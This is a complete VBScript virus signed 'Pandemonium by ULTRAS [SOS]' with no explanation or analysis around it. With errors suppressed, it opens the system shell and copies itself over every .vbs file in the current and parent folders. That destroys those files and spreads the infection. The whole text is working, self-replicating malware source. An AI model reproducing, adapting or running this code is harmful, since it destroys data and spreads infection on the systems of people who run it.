'Pandemonium by ULTRAS [SOS]
On Error Resume Next
Dim WSHShell
Set WshShell = Wscript.CreateObject("Wscript.Shell")
Dim MyShortcut, StartPath
CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")
WshShell.Run (CommandPath & " /c for %%a in (*.vbs ..\*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
